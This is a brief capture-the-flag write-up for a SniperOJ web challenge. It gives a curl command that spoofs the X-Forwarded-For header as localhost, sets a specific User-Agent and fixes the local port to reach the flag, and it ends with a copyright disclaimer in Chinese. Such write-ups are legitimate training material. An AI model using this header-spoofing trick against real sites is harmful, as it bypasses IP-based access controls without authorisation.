#### Goals
 * Try to find the flag

#### Server Address
 * http://web.sniperoj.com:10006/

#### Solution
```
curl http://127.0.0.1/ \
    --header 'X-Forwarded-For:127.0.0.1' \
    --header 'User-Agent:SniperOJ-Web-Broswer' \
    --local-port 23333
```

#### Other Solutions
 * 
## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
